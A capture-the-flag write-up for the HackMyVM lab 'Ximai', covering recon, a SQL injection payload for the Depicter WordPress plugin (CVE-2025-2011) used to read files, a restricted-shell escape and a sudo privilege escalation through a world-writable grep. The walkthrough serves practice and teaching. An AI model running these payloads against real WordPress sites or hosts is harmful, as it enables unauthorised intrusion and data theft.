# Ximai

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.32:22
Open 10.0.2.32:3306
Open 10.0.2.32:80
Open 10.0.2.32:8000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.32

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   syn-ack MariaDB 10.3.23 or earlier (unauthorized)
8000/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: NeonGrid Solutions
|_http-generator: WordPress 6.8.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/ximai/writeup.png)

```bash
└─$ feroxbuster -u http://ximai.hmv -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
200      GET      376l      965w    10938c http://ximai.hmv/index.html   -> Default Nginx Landing Page
200      GET     1022l     5262w    85790c http://ximai.hmv/info.php     -> phpinfo();
200      GET      102l      288w     3163c http://ximai.hmv/reminder.php -> ?
```

There's a "lookup" service and very very odd directory to store images.

![writeup-1.png](/assets/pentest/hackmyvm/ximai/writeup-1.png)

![writeup-2.png](/assets/pentest/hackmyvm/ximai/writeup-2.png)

```bash
└─$ curl http://ximai.hmv/that-place-where-i-put-that-thing-that-time/creds.txt
total 8.0K
drwxr-xr-x 2 root root 4.0K May 17 18:43 .
drwxr-xr-x 3 root root 4.0K May 17 18:43 ..
lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -> /etc/jimmy.txt
```

### SQLi

![writeup-3.png](/assets/pentest/hackmyvm/ximai/writeup-3.png)

Hmmm with manual and sqlmap nothing came up
```bash
└─$ sqlmap -u http://ximai.hmv/reminder.php --data 'username=*' --dbms=MySQL --batch --threads 10 --level 5 --risk 3
```


## HTTP (8000)

Potential username: `adminer` and existing vulnerability in their MySQL Config

![writeup-4.png](/assets/pentest/hackmyvm/ximai/writeup-4.png)

### CVE-2025-2011

```bash
└─$ nuclei -u http://wordpress.local:8000/
...
[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index ["wordpress"]
...
```

[CVE-2025-2011](https://cvefeed.io/vuln/detail/CVE-2025-2011): WordPress Slider & Popup Builder by Depicter SQL Injection Vulnerability

```bash
└─$ curl "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index" -s | jq
{
  "hasMore": false,
  "page": 1,
  "perpage": 20,
  "totalPages": 0,
  "totalHits": null,
  "hits": [
    {
      "id": "111",
      "createdAt": "5",
      "identifier": "",
      "source": {
        "id": null,
        "name": null,
        "type": null
      },
      "content": {
        "id": "Database: wordpress",
        "name": "4444"
      },
      "fields": []
    }
  ],
  "commonFields": []
}
```

### LFI

As the dev mentioned LFI is possible
```bash
└─$ curl "http://wordpress.local:8000/wp-admin/admin-ajax.php?perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index" -G --data-urlencode "s=1') UNION SELECT 1,2,3,4,(SELECT LOAD_FILE('/etc/passwd')) -- -" -s | jq '.hits.[].createdAt' -r | grep sh$
root:x:0:0:root:/root:/bin/bash
adminer:x:1003:1003::/home/adminer:/bin/bash
jimmy:x:1004:1004::/home/jimmy:/bin/bash

└─$ curl "http://wordpress.local:8000/wp-admin/admin-ajax.php?perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index" -G --data-urlencode "s=1') UNION SELECT 1,2,3,4,(SELECT LOAD_FILE('/etc/jimmy.txt')) -- -" -s | jq '.hits.[].createdAt' -r
HandsomeHU
```

## SSH 

```bash
└─$ sshpass -p 'HandsomeHU' ssh jimmy@ximai.hmv
jimmy@Ximai:~$ id
sorry, you are restricted from using this command.
jimmy@Ximai:~$ ls -alh
sorry, you are restricted from using this command.
jimmy@Ximai:~$ mysql
sorry, you are restricted from using this command.
jimmy@Ximai:~$ help
GNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu)
...
```

We are in some kind of restricted shell...

Any unix command I tried it's blocked, it's like if we try to run an executable binary it fails right away. No worries, we can use some bash tricks to get around that.
```bash
jimmy@Ximai:~$ cat2() { while IFS= read -r line; do echo "$line"; done < "$1"; }
jimmy@Ximai:~$ ls2() { local target="${1:-.}"; echo "$target"/.* "$target"/* 2>/dev/null; }
jimmy@Ximai:~$ ls2
./. ./.. ./... ./.bash_history ./.bash_logout ./.bashrc ./.profile ./us3r.txt
jimmy@Ximai:~$ cat2 /etc/hostname
Ximai
```

After logging into the shell, we’re immediately restricted from running most commands. The culprit is likely in the `.bashrc` file, which configures the shell environment. Inspecting it, we notice an unusual `PATH` variable that points only to local binaries in `...`, ignoring the system-wide commands. Once we reset `PATH` to include the global binaries, the restrictions disappear and the shell is fully usable.
```bash
jimmy@Ximai:~$ cat2 .bashrc
...
export PATH="./..."
...

jimmy@Ximai:~$ export PATH='/bin:/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin'
jimmy@Ximai:~$ id
uid=1004(jimmy) gid=1004(jimmy) groups=1004(jimmy),4(adm),30(dip),46(plugdev)
```

### User.txt

```bash
jimmy@Ximai:~$ cat us3r.txt
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
```

## Privilege Escalation (adminer)

```bash
jimmy@Ximai:/var/www/wordpress$ cat wp-config.php  | busybox grep ^define
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'SuperSecret' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );
define( 'AUTH_KEY',         '/3s0Z$=)9U}oo{Im<k8F$k+XLL1j}VS_|<MS6Y`?=0V0^VjB]@B~(?33n&Q&Qfh$' );
define( 'SECURE_AUTH_KEY',  '_8>Osze@4-tX&K@w>&>*bhaj]{G0?7%C$+K LktqM[*c4L?nJq*VnVtOLH:,hXdh' );
define( 'LOGGED_IN_KEY',    'In]_p@uRWc4H}*jh43sgLbOC9dT:tR,MQ-}$3WpS$pR&}kxogG~a(W1Ft}2tn{`(' );
define( 'NONCE_KEY',        'WB~X~FHk_*d^`On[{:~AtQIgD{u(|h[_(IN(HsId-a3BM/b=p<O&j9dkSjng|,>5' );
define( 'AUTH_SALT',        'G]Yhq(%bqeQoOm^nI[h~kS]^xOI)G2+[&]a>}*/tmT%K;3$GcsDN(i?R7YqP}zY3' );
define( 'SECURE_AUTH_SALT', '7[GWfTYXW3tqj$ZSz1%.,1u$h$BM0+M[2)9xSQr<GVAj%rg.PiY%>#I=l.yMVwLA' );
define( 'LOGGED_IN_SALT',   'HdS}Bck8=tz,K3zY3H2RMu@9X%;}R_V*Cx? `GGJ9/Q?$aw{q9c0;IA3Lp(%Zx7G' );
define( 'NONCE_SALT',       'mrsy5&-h{DJE o|u4IF/SbEC]Rr2B-(%]o8`3J]?23Pq35AfT ^t6%(i#%q3k,s$' );
define( 'WP_DEBUG', false );
```

Hmm.. MySQL is running as `mysql` user which might not be as useful...
```bash
jimmy@Ximai:/var/www/wordpress$ ps aux | busybox grep mysql
mysql        485  0.2  6.1 1088988 125140 ?      Ssl  12:33   0:18 /usr/sbin/mariadbd
jimmy       2085  0.0  0.0   3152   776 pts/0    S+   15:07   0:00 busybox grep mysql
```

Port 80 is hosting `adminer.php`, a single-file web application for managing databases.

![writeup-5.png](/assets/pentest/hackmyvm/ximai/writeup-5.png)

I wasn't able to identify the hash type `$wp$2y$10$`, just for safety I did global grep inside wordpress for `adminer` and it's commented in config...
```bash
jimmy@Ximai:/var/www/wordpress$ busybox grep adminer . -rin
./wp-config.php:20: * adminer:adminer123456
```

## Privilege Escalation (root)

```bash
└─$ sshpass -p 'adminer123456' ssh adminer@ximai.hmv
adminer@Ximai:~$ id
uid=1003(adminer) gid=1003(adminer) groups=1003(adminer)

adminer@Ximai:~$ sudo -l
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

The `grep` "binary" is just an ASCII file, but it's writable by everyone.
```bash
adminer@Ximai:~$ file /usr/bin/grep
/usr/bin/grep: ASCII text
adminer@Ximai:~$ cat /usr/bin/grep
echo 'sorry, you are restricted from using this command.try egrep instead.'
adminer@Ximai:~$ ls -alh /usr/bin/grep
-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep
```

```bash
adminer@Ximai:~$ nano /usr/bin/grep
#!/bin/bash
/bin/bash -i

adminer@Ximai:~$ sudo /usr/bin/grep
root@Ximai:/home/adminer# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@Ximai:/home/adminer# cat /root/r00t.txt
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
```